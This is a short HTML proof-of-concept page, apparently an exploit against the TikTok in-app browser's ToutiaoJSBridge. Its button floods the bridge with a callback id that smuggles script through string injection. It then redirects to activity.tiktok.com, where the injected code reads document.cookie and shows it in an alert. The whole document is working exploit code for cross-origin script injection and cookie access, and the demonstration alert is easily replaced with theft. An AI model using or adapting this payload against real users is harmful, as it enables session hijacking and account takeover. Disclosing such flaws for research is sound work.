<html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <link rel="prefetch" href="https://activity.tiktok.com/">
    <title>InnocentSite...</title>
    
    <script>
      var payload = `
              setTimeout(function () {
                if (!window.called && location.href.includes("activity.tiktok.com")) {
                  alert("Show me your cookie:\\n" + document.cookie);
                  window.called = true;
                }
              }, 1000);
              `;
      
      function exp() {
        setTimeout(function () {
          for (var i=0; i<1024; i++) {
            ToutiaoJSBridge.invokeMethod(JSON.stringify({'__callback_id': '" + ' + payload + '+"'}));
          }
        }, 0);
        
        window.location.href='https://activity.tiktok.com/'
      }
    
    </script>
  </head>
  <body>
    <button onclick="exp();">Goforit...</button>
  </body>
